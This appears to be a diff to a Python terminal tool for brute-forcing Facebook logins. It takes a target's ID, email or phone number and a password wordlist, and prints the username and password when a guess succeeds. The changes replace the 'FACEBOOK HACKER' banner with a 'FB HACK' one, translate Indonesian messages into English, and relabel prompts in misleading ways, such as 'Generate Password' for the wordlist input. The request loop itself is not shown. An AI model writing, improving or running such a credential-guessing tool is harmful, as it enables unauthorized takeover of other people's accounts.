@@ -38,12 +38,12 @@ internet = '''
     Internet
 '''
 banner = '''
-\033[31;1m____ ____ ____ ____ ___  ____ ____ _  _
-|___ |__| |    |___ |__] |  | |  | |_/ 
-\033[37;1m|    |  | |___ |___ |__] |__| |__| | \_
-\033[31;1m          _  _ ____ ____ _  _ ____ ____
-          |__| |__| |    |_/  |___ |__/
-\033[37;1m          |  | |  | |___ | \_ |___ |  \\
+
+\033[32m░█─── ░█▀▀▀█ ░█▀▀█ ░█▀▀▀ ▀▄░▄▀ 　 ░█▀▀▀ ░█▀▀█ 　 ░█─░█ ─█▀▀█ ░█▀▀█ ░█─▄▀ 
+░█─── ░█──░█ ░█▄▄▀ ░█▀▀▀ ─░█── 　 ░█▀▀▀ ░█▀▀▄ 　 ░█▀▀█ ░█▄▄█ ░█─── ░█▀▄─ 
+░█▄▄█ ░█▄▄▄█ ░█─░█ ░█▄▄▄ ▄▀░▀▄ 　 ░█─── ░█▄▄█ 　 ░█─░█ ░█─░█ ░█▄▄█ ░█─░█
+\033[0m
+
 \033[36;1mCreated By\033[31;1m :\033[32;1m Lore Dave P. \033[32;1m[\033[37;1mL0R3X AI\033[32;1m]
 ------------------------------------------
 '''
@@ -52,7 +52,7 @@ def ceknet():
     try:
         os.system('clear')
         print(internet)
-        print('\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mMeriksa Koneksi Internet')
+        print('\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1fetching data files from facebook...')
         time.sleep(2)
         toolbar_width = 25
         sys.stdout.write('[%s]' % ('-\033[37;1m' * toolbar_width))
@@ -72,13 +72,13 @@ def ceknet():
             start()
         except requests.exceptions.ConnectionError:
             time.sleep(3.5)
-            print('\033[37;1m]\033[35;1m ~>\033[31;1m Tidak Ada koneksi')
+            print('\033[37;1m]\033[35;1m ~>\033[31;1m No Connection')
             time.sleep(1.5)
             sys.exit()
 
     except KeyboardInterrupt:
         time.sleep(3.5)
-        exit('\n\033[37;1m[\x1b[92mx\033[37;1m] \033[31;1mProgram berhenti\n')
+        exit('\n\033[37;1m[\x1b[92mx\033[37;1m] \033[31;1mthe program stop. please run the program again\n')
 
 
 def start():
@@ -86,12 +86,12 @@ def start():
         os.system('clear')
         print(banner)
         email = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail\033[36;1m | \033[37;1mHP \033[31;1m: \033[32;1m')
-        passw = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist   \033[31;1m:\033[32;1m ')
+        passw = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Generate Password   \033[31;1m:\033[32;1m ')
         total = open(passw, 'r')
         total = total.readlines()
         print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email)
         time.sleep(3.0)
-        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List \033[36;1m:\033[32;1m ' + str(len(total)))
+        print('\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1m \033[36;1m:\033[32;1m ' + str(len(total)))
         time.sleep(3.0)
         print()
         sandi = open(passw, 'r')
@@ -110,7 +110,7 @@ def start():
                     print('\n\n\033[32;1m[+] \033[37;1mPASSWORD FOUND')
                     print('\033[32;1m[+] \033[37;1mUsername \033[32;1m: \033[35;1m'+email)
                     print('\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
-                    print('\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCES')
+                    print('\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCESS')
                     print('\033[32;1m[=] \033[37;1mProgram Finish')
                     sys.exit()
                 else:
@@ -126,12 +126,12 @@ def start():
                         print('\033[33;1m[=] \033[37;1mProgram Finish')
                         sys.exit()
             except requests.exceptions.ConnectionError:
-                print('\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mkoneksi error')
+                print('\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mconnection timeout')
                 sys.exit()
 
     except IOError:
-        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist tidak ada')
-        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mSaya sarankan Untuk Membuatnya sendiri')
+        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mThe password address does not exist')
+        print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mI suggest making it yourself')
         sys.exit()
 
 ceknet()
